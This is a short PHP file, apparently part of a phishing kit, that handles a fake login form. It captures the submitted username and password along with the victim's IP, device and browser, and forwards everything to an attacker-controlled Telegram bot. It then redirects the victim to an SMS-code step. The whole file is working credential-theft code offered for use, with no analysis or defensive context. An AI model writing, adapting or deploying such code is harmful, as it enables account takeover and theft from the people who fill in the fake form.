<?php 
require './config.php';
include'./agent.php';
$ip = getenv("REMOTE_ADDR");
$usr = $_POST['usr'];
$pwd = $_POST['pwd'];
if (!empty($usr) AND !empty($pwd)) {
	$coronamsg .= "[⚜️] ┏━ [ $ip ] ━┓[⚜️]\n";
	$coronamsg .= "[📭] USER : $usr\n";
	$coronamsg .= "[🔑] PASS : $pwd\n";
	$coronamsg .= "[🔅] ᴅᴇᴠɪᴄᴇ : $user_os\n";
	$coronamsg .= "[🔅] ʙʀᴏᴡsᴇʀ : $user_browser\n";
	$coronamsg .= "[⚜️] By Solzy01\n";
	$token = "$coronatoken";
    $data = [
    'text' => $coronamsg,
    'chat_id' => $coronachat,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    header("Location: ./wait.php?next=sms.php");
}
else{
	header('Location: ./index.php');
}?>
